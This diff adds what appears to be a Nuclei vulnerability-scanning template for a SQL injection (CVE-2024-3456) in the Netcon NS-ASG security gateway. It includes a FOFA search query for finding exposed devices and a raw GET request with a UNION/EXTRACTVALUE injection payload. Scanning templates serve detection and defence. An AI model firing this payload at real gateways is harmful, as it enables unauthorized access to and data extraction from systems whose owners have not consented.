@@ -1,0 +1,23 @@
+id: NS-ASG-config_Anticrack-sqli
+
+info:
+  name: 网康应用安全网关(NS-ASG)-SQL注入-config_Anticrack(CVE-2024-3456)
+  author: final
+  severity: critical
+  metadata: 
+    fofa-query: app="网康科技-NS-ASG安全网关"
+requests:
+  - raw:
+      - |
+        GET /admin/config_Anticrack.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5(123456)),0x7e)) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "adc3949ba59abbe56e057")'
